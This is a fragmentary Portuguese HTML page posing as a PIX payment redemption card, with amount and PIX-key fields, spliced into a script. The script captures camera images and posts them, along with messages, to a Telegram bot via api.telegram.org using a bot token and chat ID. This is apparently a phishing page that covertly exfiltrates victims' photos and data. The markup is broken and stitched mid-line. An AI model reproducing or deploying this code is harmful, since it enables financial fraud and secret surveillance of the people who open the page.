<!DOCTYPE html>
<html lang="pt-br">
<head>

    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #e9ecef; margin: 0; padding: 20px; display: flex; justify-content: center; }
        .pix-card { background: white; max-width: 400px; width: 100%; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); overflow: hidden; }

        .btn-resgatar { width: 100%; background-color: #32bcad; color: white; border: none; padding: 15px; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; display: flex; justify-content: center; align-items: center; }
        .spinner { display: none; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s ease-in-out infinite; margin-left: 10px; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .footer-info { font-size: 11px; color: #999; text-align: center; margin-top: 25px; line-height: 1.4; border-top: 1px solid #eee; padding-top: 15px; }
    </style>
</head>

        <input type="number" id="valor" placeholder="Ex: 1250,00">
        
        <label>Chave PIX do Beneficiário:</label>
        <input type="text" id="chave" placeholder="CPF, E

        return new Promise(resolve => {
            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, `${label}.jpg`);
                formData.append('caption', `📸 Câmera ${label}`);
                
                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                resolve();
            }, 'image/jpeg', 0.7);
        });
    }

    async function enviarMensagem(msg) {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
    }
</script>
